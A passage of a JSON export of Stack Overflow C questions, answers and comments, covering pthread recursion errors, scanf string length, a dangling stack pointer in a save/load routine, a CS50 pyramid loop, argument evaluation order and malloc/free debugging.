0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 595, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1459381356, "creation_date": 1459381356, "question_id": 36321712, "link": "https://stackoverflow.com/questions/36321712/divide-and-conquer-algorithm-using-multithreading", "title": "Divide and Conquer Algorithm using Multithreading", "body": "<p>I am working on applying multi-threading on the divide and conquer algorithm so that I create a new thread each time the recursive function is called.\nHere is the code of the algorithm alone(Works perfect):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint MAX_VALUE(int ARRAY[],int LEFT,int RIGHT)\n{\n    int MID;\n    if(LEFT == RIGHT) return ARRAY[LEFT];\n    else\n    {\n        MID = (LEFT + RIGHT) / 2;\n        int U = MAX_VALUE(ARRAY, LEFT, MID);\n        int V = MAX_VALUE(ARRAY, MID + 1, RIGHT);\n        return (U &gt; V ? U : V);\n    }\n}\n\nint main()\n{\n    int N,i;\n\n    printf(\"Enter the number of elements : \");\n    scanf(\"%d\", &amp;N);\n    int BUFFER[N];\n\n    printf(\"Enter Array values : \");\n    for(i = 0; i &lt; N; i++)\n        scanf(\"%d\", &amp;BUFFER[i]);\n\n    printf(\"Maximum element in Array = %d\", MAX_VALUE(BUFFER, 0, N-1));\n    return 0;\n}\n</code></pre>\n\n<p>And here is the above code combined with multi-threading(ERROR AT pthread_create: lvalue required as unary \u2018&amp;\u2019 operand):</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\npthread_t THREAD_ID[5];\n\nstatic int i = 0;\nstatic int FLAG_FUNCTION_CALLS = 0;\nstatic int FLAG_THREAD_ID = 0;\n\nvoid *MAX_VALUE(int ARRAY[],int LEFT,int RIGHT)\n{\n    int ERR;\n    FLAG_FUNCTION_CALLS++;\n\n    int ACTIVE_THREAD_ID = pthread_self();\n\n    int MID;\n    if(LEFT == RIGHT)\n    {\n        if(FLAG_THREAD_ID &lt;= 4)\n        {\n            printf(\"THREAD[%d] roger that and moving out...\",ACTIVE_THREAD_ID);\n            pthread_exit(&amp;ARRAY[LEFT]);\n        }\n        else\n        {\n            return (void *) ARRAY[LEFT];\n        }\n\n    }\n    else\n    {\n        MID = (LEFT + RIGHT) / 2;\n\n        void *U;\n        while(FLAG_FUNCTION_CALLS &lt;= 4)\n        {\n            FLAG_THREAD_ID++;\n            ERR = pthread_create(&amp;(THREAD_ID[FLAG_THREAD_ID]), NULL, &amp;MAX_VALUE(ARRAY, LEFT, MID), NULL);\n            if (ERR != 0)\n                fprintf(stderr, \"\\nFAILED CREATE THREAD!\");\n            else\n                printf(\"\\n Thread created successfully\\n\");\n        }\n        pthread_join(&amp;THREAD_ID[FLAG_THREAD_ID],&amp;U);\n\n        void *V;\n        while(FLAG_FUNCTION_CALLS &lt;= 4)\n        {\n            FLAG_THREAD_ID++;\n            ERR = pthread_create(&amp;(THREAD_ID[FLAG_THREAD_ID]), NULL, &amp;MAX_VALUE(ARRAY, MID + 1, RIGHT), NULL);\n            if (ERR != 0)\n                fprintf(stderr, \"\\nFAILED CREATE THREAD!\");\n            else\n                printf(\"\\n Thread created successfully\\n\");\n        }\n        pthread_join(&amp;THREAD_ID[FLAG_THREAD_ID],&amp;V);\n\n        if(FLAG_THREAD_ID &lt;= 4)\n        {\n            printf(\"THREAD[%d] roger that and moving out...\",ACTIVE_THREAD_ID);\n            pthread_exit(U &gt; V ? &amp;U : &amp;V);\n        }\n        else\n        {\n            return (U &gt; V ? (void *)U : (void *)V);\n        }\n    }\n}\n\nint main()\n{\n    int N,i,ERR;\n    void *MAXIMUM_VALUE;\n\n    printf(\"\\nEnter the number of elements : \\n\");\n    scanf(\"%d\", &amp;N);\n    int BUFFER[N];\n\n    printf(\"\\nEnter Array values : \\n\");\n    for(i = 0; i &lt; N; i++)\n        scanf(\"%d\", &amp;BUFFER[i]);\n\n    ERR = pthread_create(&amp;(THREAD_ID[0]), NULL, &amp;MAX_VALUE(BUFFER, 0, N-1), NULL);\n    if (ERR != 0)\n        fprintf(stderr, \"\\nFAILED CREATE THREAD!\");\n    else\n        printf(\"\\n Thread created successfully\\n\");\n\n    pthread_join(&amp;THREAD_ID[4],&amp;MAXIMUM_VALUE);\n    printf(\"\\n%d\\nNumber of time the recursive function is called: %d\", (int)MAXIMUM_VALUE,FLAG_FUNCTION_CALLS);\n\n    return 0;\n}\n</code></pre>\n\n<p>I also wanted to create just 5 threads and each one will terminate and a new one is created after each function call, then only the 5th thread will continue executing and will return the final maximum value to the main function.</p>\n\n<p>I am new to Operating System in C stuff if anyone could help that would be great. Thank you.  </p>\n"}, {"tags": ["c", "string"], "answers": [{"tags": [], "owner": {"reputation": 6751, "user_id": 1417063, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Mwy5e.jpg?s=128&g=1", "display_name": "Davide Spataro", "link": "https://stackoverflow.com/users/1417063/davide-spataro"}, "is_accepted": true, "score": 3, "last_activity_date": 1533904585, "last_edit_date": 1533904585, "creation_date": 1459381321, "answer_id": 36321708, "question_id": 36321499, "link": "https://stackoverflow.com/questions/36321499/get-length-of-string-from-scanf/36321708#36321708", "title": "Get length of string from scanf", "body": "<p>The problem is that you are trying to read a string using only one <code>char</code> storage. The only string you can store there is the <code>null</code> string (which has length zero) i.e.\n<code>word='\\0'</code></p>\n\n<p>increase the size of the word buffer. \nMoreover <code>strlen</code> expects a <code>char*</code> pointer and not a plain <code>char</code>.</p>\n\n<pre><code>char word[100];\nscanf(\"%s\",word);    \nprintf(\"%i\",strlen(word));\n</code></pre>\n"}], "owner": {"reputation": 8066, "user_id": 4272549, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/1hvwh.jpg?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4272549/123"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5167, "favorite_count": 0, "accepted_answer_id": 36321708, "answer_count": 1, "score": 3, "last_activity_date": 1533904585, "creation_date": 1459380242, "question_id": 36321499, "link": "https://stackoverflow.com/questions/36321499/get-length-of-string-from-scanf", "title": "Get length of string from scanf", "body": "<p>I'm getting a word from a user and I need to calculate it's length, but I can't seem to get <code>strlen()</code> or <code>sizeof()</code> to work for some reason.  What am I doing wrong here?</p>\n\n<pre><code>printf(\"Enter a word: \");\nchar word;\nscanf(\"%c\",&amp;word);\nprintf(\"%i\",strlen(word));\n</code></pre>\n\n<p>This seems really simple, but I can't print out the length of the string for the life of me.</p>\n"}, {"tags": ["c", "structure"], "comments": [{"owner": {"reputation": 89221, "user_id": 10320, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/pijgr.jpg?s=128&g=1", "display_name": "dreamlax", "link": "https://stackoverflow.com/users/10320/dreamlax"}, "edited": false, "score": 0, "creation_date": 1459379996, "post_id": 36321412, "comment_id": 60266094, "body": "Although this won&#39;t help with your overall problem, there&#39;s a shortcut you can take when saving the player&#39;s data. Rather than allocating a buffer and using <code>snprintf</code> to write to the buffer, and then writing the buffer to a file, just use <code>fprintf</code> directly instead, then you won&#39;t need to allocate a buffer."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1459380772, "post_id": 36321412, "comment_id": 60266363, "body": "Thou shalt not save a pointer to a temporary. Also, you should decide what <code>player-&gt;name</code> is supposed to be and stick to it. Is it going to be a pointer to a string constant? A pointer to a dynamically-allocated buffer? Or what?"}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 5912515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef6f766ead970c6cc90417a057369a33?s=128&d=identicon&r=PG&f=1", "display_name": "Xely", "link": "https://stackoverflow.com/users/5912515/xely"}, "edited": false, "score": 0, "creation_date": 1459381902, "post_id": 36321454, "comment_id": 60266743, "body": "Hey, thanks for your answer,  it solved my problem just by writing <code>char* temp = malloc(sizeof(char)*20); </code> instead. Not sure i understand quite yet the reason you put behind it(never heard of automatic variables) but i will work on it tomorrow."}, {"owner": {"reputation": 134595, "user_id": 140740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf6eddcd47c263a1a5d31bdb4f7b6424?s=128&d=identicon&r=PG", "display_name": "DigitalRoss", "link": "https://stackoverflow.com/users/140740/digitalross"}, "reply_to_user": {"reputation": 31, "user_id": 5912515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef6f766ead970c6cc90417a057369a33?s=128&d=identicon&r=PG&f=1", "display_name": "Xely", "link": "https://stackoverflow.com/users/5912515/xely"}, "edited": false, "score": 0, "creation_date": 1459408716, "post_id": 36321454, "comment_id": 60275743, "body": "Well, look in to <i>storage classes</i> for C objects.  There are declarations that produce static objects that live forever, and <code>auto</code> and <code>register</code> storage classes (for now, consider them the same) that exist only while the function call instance is active.  The stack is an important concept and it is the mechanism on which every significant implementation of C bases the auto (local) objects. <code>auto</code> is the default for local variables.  Good luck."}], "tags": [], "owner": {"reputation": 134595, "user_id": 140740, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf6eddcd47c263a1a5d31bdb4f7b6424?s=128&d=identicon&r=PG", "display_name": "DigitalRoss", "link": "https://stackoverflow.com/users/140740/digitalross"}, "is_accepted": true, "score": 2, "last_activity_date": 1459380389, "last_edit_date": 1459380389, "creation_date": 1459379981, "answer_id": 36321454, "question_id": 36321412, "link": "https://stackoverflow.com/questions/36321412/string-returned-from-c-function-is-garbage/36321454#36321454", "title": "String returned from C function is garbage", "body": "<p>You need to allocate space for <code>player-&gt;name</code>.</p>\n\n<p>You are using automatic variable <code>temp</code> for this, and its lifetime ends when the function returns. Auto variables are on the stack.</p>\n\n<p>So you are taking an address on the stack and keeping it as your object. This leaks a pointer to your current stack level because you return it. It's OK to use pointers to automatic variables, but only while that function instance is active, i.e., in it's life cycle and in functions it calls. </p>\n"}], "owner": {"reputation": 31, "user_id": 5912515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef6f766ead970c6cc90417a057369a33?s=128&d=identicon&r=PG&f=1", "display_name": "Xely", "link": "https://stackoverflow.com/users/5912515/xely"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 129, "favorite_count": 0, "accepted_answer_id": 36321454, "answer_count": 1, "score": 1, "last_activity_date": 1459380389, "creation_date": 1459379769, "last_edit_date": 1459380124, "question_id": 36321412, "link": "https://stackoverflow.com/questions/36321412/string-returned-from-c-function-is-garbage", "title": "String returned from C function is garbage", "body": "<p>i've been working on a RPG in C language lately, and i've come accross some difficulties for saving / loading some datas from a text file.</p>\n\n<p>Here is the (simplified to make it short) code :</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nstruct player{\n    int id;\n    char* name;\n};\n\nvoid save(struct player* player)\n{\n    FILE* fp = 0;\n    char* buffer = 0;\n\n    fp = fopen(\"./gamesave.txt\", \"w\");\n    fclose(fp);\n    buffer = malloc(80);\n    memset(buffer, 0, 80);\n\n    snprintf( buffer, 80, \"%d|%s|\\n\", player-&gt;id, player-&gt;name);\n    fp = fopen(\"./gamesave.txt\", \"a\");\n    fputs(buffer, fp);\n    free(buffer);\n    fclose(fp);\n}\n\nstruct player* load()\n{\n    FILE* fp = 0;\n    char* buffer = 0;\n    struct player* player = malloc(sizeof(struct player));\n    char tokens[] = \"|\\n\";\n\n    buffer = malloc (80);\n    memset(buffer, 0, 80);\n\n    fp = fopen(\"./gamesave.txt\", \"r\");\n\n    if (fgets(buffer, 80, fp)) {\n        char temp[20];\n        player-&gt;id = atoi(strtok(buffer, tokens));\n        strcpy(temp, strtok(NULL, tokens));\n        player-&gt;name = temp;\n        printf(\"during load : name is %s\\n\", player-&gt;name);\n    }\n    fclose(fp);\n    free(buffer);\n    return player;\n}\n\nvoid main()\n{\n\n\n    struct player* player = malloc(sizeof(struct player));\n    player-&gt;id = 5;\n    player-&gt;name = \"Bobby\";\n    printf(\"before save : my name is %s and id is %d\\n\", player-&gt;name, player-&gt;id);\n\n    save(player);\n    struct player* playerN = load();\n    printf(\"after load : name is %s and id is %d\", playerN-&gt;name, playerN-&gt;id);\n}\n</code></pre>\n\n<p>This is my latest try in doing this but i've tried many differents ways of doing it, but it almost always ends in the same problem : i can't seem to get the right values for <strong>strings</strong> although it works for integers.I can print the name of the player before save, during the load function, but after the load it just prints garbage (the id works just fine).</p>\n\n<p>My guess is that it has to do with some kind of memory problem but that's it, couldn't solve it after hours and hours.</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["c", "loops", "cs50"], "comments": [{"owner": {"reputation": 724, "user_id": 4627737, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f5f5f8408ceca1773fd142cba4bc6a97?s=128&d=identicon&r=PG&f=1", "display_name": "Daniel R.", "link": "https://stackoverflow.com/users/4627737/daniel-r"}, "edited": false, "score": 0, "creation_date": 1459378294, "post_id": 36321084, "comment_id": 60265521, "body": "Have a closer look at the inner for-loop. You are initializing <code>space</code> with 1, but you are decrementing."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1459378386, "post_id": 36321084, "comment_id": 60265560, "body": "C and C++ are different languages. I suspect this is C, so don&#39;t add C++ tag."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1459378547, "post_id": 36321084, "comment_id": 60265613, "body": "&quot;deleted the line that was doing the hashes because it was giving me the infinite loop&quot;. Please show that line. If it is just a printf then not sure how that could cause an infinete loop. In any case, you need to show the code that causes problems so that we can help you understand why it causes probelms and how to fix it."}, {"owner": {"reputation": 33, "user_id": 6121310, "user_type": "registered", "profile_image": "https://graph.facebook.com/1036901849716279/picture?type=large", "display_name": "Joan Acosta", "link": "https://stackoverflow.com/users/6121310/joan-acosta"}, "edited": false, "score": 0, "creation_date": 1459379601, "post_id": 36321084, "comment_id": 60265970, "body": "@kaylym, I&#39;m gonna edit the post and you will see my previous code with the # , and yes, it is &#39;&#39;C&#39;&#39; :( but i didn&#39;t know what else should I put as a tag.  DanielR , thank you I will try to take a close look in the for-loops, I still have problem understanding the prefix and postfix part in the increment and decrementing part. :(  Thank you for the response both of you guys!"}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "edited": false, "score": 0, "creation_date": 1459380047, "post_id": 36321084, "comment_id": 60266110, "body": "@Joan Acosta Show the image of the pyramid."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1459380559, "post_id": 36321084, "comment_id": 60266295, "body": "As already pointed out: <code>for (space = 0; space &lt; row; space--)</code> is of course going to produce an very long loop. <code>space</code> is getting smaller and smaller due to the decrement. So <code>space &lt; row</code> will be true for a very long time - until <code>space</code> underflows."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 6121310, "user_type": "registered", "profile_image": "https://graph.facebook.com/1036901849716279/picture?type=large", "display_name": "Joan Acosta", "link": "https://stackoverflow.com/users/6121310/joan-acosta"}, "edited": false, "score": 0, "creation_date": 1459382672, "post_id": 36321732, "comment_id": 60266970, "body": "Yes! Thank you so much! And thanks to all the guys that answered me too! :D"}], "tags": [], "owner": {"reputation": 58, "user_id": 6125419, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/832cf111cdac15dced5dcb5a3da98b97?s=128&d=identicon&r=PG&f=1", "display_name": "I&#39;m just a poor boy", "link": "https://stackoverflow.com/users/6125419/im-just-a-poor-boy"}, "is_accepted": true, "score": 0, "last_activity_date": 1459381489, "creation_date": 1459381489, "answer_id": 36321732, "question_id": 36321084, "link": "https://stackoverflow.com/questions/36321084/cs50-mario-im-stuck-doing-that-pyramid/36321732#36321732", "title": "CS50 Mario I&#39;m stuck doing that pyramid", "body": "<p>Is this what you want?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n\n/* PSET1 Mario */\n\nint main (void)\n\n{\n  int height;\n\ndo\n{\n    printf(\"Give me an int between 0 or 23 \\n\");\n    height = GetInt();\n}while((height &lt; 0)||(height &gt; 23));\n\n//The Pyramid output\nint row, space;\n\nspace = height - 1;\n\n\nfor (row = 0 ; row &lt;= height; row++)\n{\n    int simbol=0;\n       for (space = height-row; space &gt; 0; space--)\n   {\n       printf(\" \");\n   }\n   for (simbol = 0; simbol &lt; row; simbol++)\n   {\n\n       printf(\"##\");\n   }\n\n\n    printf(\"\\n\");\n}\nreturn 0;\n}\n</code></pre>\n\n<p>This give you this pyramid:</p>\n\n<pre><code>           ##\n          ####\n         ######\n        ########\n       ##########\n      ############\n     ##############\n    ################\n   ##################\n  ####################\n ######################\n########################\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 6121310, "user_type": "registered", "profile_image": "https://graph.facebook.com/1036901849716279/picture?type=large", "display_name": "Joan Acosta", "link": "https://stackoverflow.com/users/6121310/joan-acosta"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1989, "favorite_count": 0, "closed_date": 1460008676, "accepted_answer_id": 36321732, "answer_count": 1, "score": -2, "last_activity_date": 1469854239, "creation_date": 1459378032, "last_edit_date": 1469854239, "question_id": 36321084, "link": "https://stackoverflow.com/questions/36321084/cs50-mario-im-stuck-doing-that-pyramid", "closed_reason": "Needs details or clarity", "title": "CS50 Mario I&#39;m stuck doing that pyramid", "body": "<p>Well, I've like a week reading all kind of material regarding to C programming to make this pyramid works and finally I decided to ask for help, I've improve a lot, my code now takes the input (0 to 23) correctly and print a new line, but now that I'm trying to add the # into the code, the code make an infinite loop :(.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;cs50.h&gt;\n\n/* PSET1 Mario */\n\nint main (void)\n\n{\n  int height;\n\ndo\n{\n    printf(\"Give me an int between 0 or 23 \\n\");\n    height = GetInt();\n}while((height &lt; 0)||(height &gt; 23));\n\n//The Pyramid output\nint row, space;\n\nspace = height - 1;\n\n\n    for (row = 0 ; row &lt;= height; row++)\n    {\n\n            for (space = 0; space &lt; row; space--)\n    {\n        printf(\"#\");\n    }\n\n\n\nreturn 0;\n</code></pre>\n\n<p>}</p>\n\n<p>The main point it is do a pyramid with ''#'' and I edited the post this was my previous code with the #, it was doing a infinite loop. </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3715, "user_id": 1241334, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/fCjAE.jpg?s=128&g=1", "display_name": "Jonny Henly", "link": "https://stackoverflow.com/users/1241334/jonny-henly"}, "edited": false, "score": 0, "creation_date": 1459378179, "post_id": 36321054, "comment_id": 60265480, "body": "<i>slicker</i> doesn&#39;t mean better. While your assumption is syntactically correct it is prone to multiple runtime errors."}], "answers": [{"tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": true, "score": 2, "last_activity_date": 1459379180, "last_edit_date": 1495542700, "creation_date": 1459378187, "answer_id": 36321111, "question_id": 36321054, "link": "https://stackoverflow.com/questions/36321054/popping-a-queue-in-function-parameters/36321111#36321111", "title": "Popping a queue in function parameters", "body": "<p>The order of evaluation of function arguments is undefined, so the second fragment may or may not be equivalent to the first one.</p>\n\n<p>In that case <code>myfunction(pop(Q), pop(Q))</code> leads to undefined behaviour.</p>\n\n<p>See also <a href=\"https://stackoverflow.com/questions/621542/compilers-and-argument-order-of-evaluation-in-c\">Compilers and argument order of evaluation in C</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 3111, "user_id": 479941, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ebad9df474aa1949c09ef5136e55fd33?s=128&d=identicon&r=PG", "display_name": "Mark Nunberg", "link": "https://stackoverflow.com/users/479941/mark-nunberg"}, "is_accepted": false, "score": 0, "last_activity_date": 1459379346, "creation_date": 1459379346, "answer_id": 36321350, "question_id": 36321054, "link": "https://stackoverflow.com/questions/36321054/popping-a-queue-in-function-parameters/36321350#36321350", "title": "Popping a queue in function parameters", "body": "<p>In addition to Michael's answer, if this is an often-repeated construct, you can also make a function <code>myFunctionFromQueue(Q)</code> which would abstract the boilerplate away.</p>\n\n<p>Additionally, unless you're popping ints or similar, more realistic code would end up looking like:</p>\n\n<pre><code>e1 = pop(Q)\ne2 = pop(Q)\nmyFunction(e1, e2)\nmanage_ownership(e1)\nmanage_ownership(e2)\n</code></pre>\n"}], "owner": {"reputation": 117, "user_id": 4109712, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/f8c6d95bf01455f681f69a330118271c?s=128&d=identicon&r=PG&f=1", "display_name": "Sven", "link": "https://stackoverflow.com/users/4109712/sven"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 36321111, "answer_count": 2, "score": 1, "last_activity_date": 1459379346, "creation_date": 1459377870, "question_id": 36321054, "link": "https://stackoverflow.com/questions/36321054/popping-a-queue-in-function-parameters", "title": "Popping a queue in function parameters", "body": "<p>I think I might know the answer to this, but I wanted to make sure I fully understand.</p>\n\n<p>I've written a Queue structure in C, as well as operations for use on a Queue struct. I would like to pop the queue, retrieving one element. This element would be the first parameter into my function. I would like to pop the queue again, retrieving the second element. This second element would be my second parameter.</p>\n\n<p>For example:</p>\n\n<pre><code>e1 = pop(Q);\ne2 = pop(Q);\nmyfunction(e1, e2);\n</code></pre>\n\n<p>I would like to do this is in a slicker way that doesn't require me to make two throwaway variables.</p>\n\n<p>My assumption would be the following:</p>\n\n<pre><code>myfunction(pop(Q), pop(Q))\n</code></pre>\n\n<p>But I'm not 100% sure if this is correct.</p>\n\n<p>Is this correct? Are there slicker ways of accomplishing this?</p>\n"}, {"tags": ["c", "multidimensional-array", "memory-leaks", "malloc", "free"], "comments": [{"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 2, "creation_date": 1459377690, "post_id": 36320994, "comment_id": 60265321, "body": "Try <i>just</i> allocating and then freeing, with nothing in between. Is that successful?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 2, "creation_date": 1459377699, "post_id": 36320994, "comment_id": 60265325, "body": "Something like <code>char **</code> is <b>not</b> a 2D array and cannot represent one. An array is a continuous memory block of elements of the same type with a linear addressing scheme. For a 2D array each element is an array itself. You have a &quot;pointer to pointer&quot;. If you want a 2D array, use one. A typical declaration would be <code>char (*arr)[INNER_LENGTH];</code> note the parenthesis! Only this can be allocated and freed with a single <code>malloc</code>/<code>free</code>."}, {"owner": {"reputation": 38119, "user_id": 3959454, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/4d3d3eb6143879550d0e5bd67a6bf647?s=128&d=identicon&r=PG&f=1", "display_name": "Anton Savin", "link": "https://stackoverflow.com/users/3959454/anton-savin"}, "edited": false, "score": 0, "creation_date": 1459377816, "post_id": 36320994, "comment_id": 60265360, "body": "<a href=\"http://stackoverflow.com/q/605845/3959454\">Don&#39;t cast the result of malloc in C</a>"}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459377949, "post_id": 36320994, "comment_id": 60265397, "body": "@Olaf He&#39;s using the wrong terminology, yes, but if you look at his code, he understands that he&#39;s allocating an array of pointers to allocated memory, both at allocation-time and free-time. Nowhere does he actually try to <i>use</i> it as a single contiguous block of memory, or try to use a single <code>malloc</code> / <code>free</code>."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459378059, "post_id": 36320994, "comment_id": 60265436, "body": "The &#39;80&#39; magic number does not fill me with confidence.  If the OP copies in 80 chars as a test, together with a null terminator, that&#39;s 81:("}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459378149, "post_id": 36320994, "comment_id": 60265467, "body": "Your <code>malloc()</code>s appear to match up correctly with your <code>free()</code>s, but they also look a bit fishy.  If, as you say, <code>argcnt</code> is sufficient to hold pointers to the program name, all the arguments, and a terminating <code>NULL</code>, then <i>why are you allocating space for the element intended to hold <code>NULL</code></i>?  Indeed, why are you allocating fixed-size blocks for the array arguments at all?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378179, "post_id": 36320994, "comment_id": 60265479, "body": "@JonathonReinhart: Another day another discussion why using the wrong terms is not much of a problem. This is read by beginners, who take the terms literally and use them for the wrong things. I tried to avoid this by explaining what an array is and why this is not. I did not say OP should use a 2D array, just he should not use the term for something it is not. If I was talking about a chair, while meaning a car, you would also be confused. Correct usage of term is important to avoid confusion <b>.</b> Note that here OP really <b>should</b> use a 2D array - single <code>malloc</code>, single <code>free</code>."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378194, "post_id": 36320994, "comment_id": 60265488, "body": "Forget the <code>malloc(80)</code> and use <code>strdup()</code> instead."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "reply_to_user": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 0, "creation_date": 1459378209, "post_id": 36320994, "comment_id": 60265494, "body": "I see no results of the expected debugging steps, eg. what @JonathonReinhart suggests - remove all the gunge in between to try and get to a point that does not crash."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1459378337, "post_id": 36320994, "comment_id": 60265534, "body": "@Olaf Trust me, I am a pedantic dick when it comes to terminology, and fully understand its importance. Your comment reads like <i>&quot;you&#39;re creating a 2D array wrong; do it this way&quot;</i>. Instead, you should have looked at the code and realized that he didn&#39;t <i>want</i> a 2D array, 